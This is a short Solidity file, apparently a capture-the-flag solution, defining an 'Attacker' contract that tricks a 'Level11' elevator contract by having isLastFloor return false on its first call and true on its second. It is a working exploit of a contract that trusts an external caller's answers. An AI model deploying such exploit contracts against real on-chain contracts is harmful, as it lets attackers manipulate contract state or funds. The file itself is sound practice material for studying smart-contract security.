// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "./Level11.sol";

contract Attacker {

  bool public hasBeenCalled = false;
  Level11 public level11;

  constructor(address _target) {
    level11 = Level11(_target);
  }

  function attack() external {
    level11.goTo(10);
  }

  function isLastFloor(uint _floor) external returns (bool) {
    if(hasBeenCalled) {
      return true;
    }
    hasBeenCalled = true;
    return false;
  }
}